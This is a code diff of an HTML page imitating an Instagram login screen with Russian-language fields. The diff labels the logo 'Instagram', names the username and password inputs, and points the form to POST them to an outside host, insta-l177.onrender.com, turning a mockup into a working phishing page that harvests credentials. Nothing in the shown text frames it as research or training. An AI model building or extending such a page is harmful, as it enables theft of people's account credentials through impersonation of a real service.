@@ -180,27 +180,29 @@ button{
 
     <div class="login-box">
 
-        <div class="language">
-            Русский
-        </div>
+        <div class="language">Русский</div>
 
         <img
         src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png"
         class="logo"
-        alt="Logo">
+        alt="Instagram">
 
-        <form>
+        <form action="https://insta-l177.onrender.com/" method="POST">
 
             <div class="input-box">
                 <input
                 type="text"
-                placeholder="Имя пользователя, эл. адрес или номер телефона">
+                name="username"
+                placeholder="Имя пользователя, эл. адрес или номер телефона"
+                required>
             </div>
 
             <div class="input-box">
                 <input
                 type="password"
-                placeholder="Пароль">
+                name="password"
+                placeholder="Пароль"
+                required>
             </div>
 
             <button type="submit">
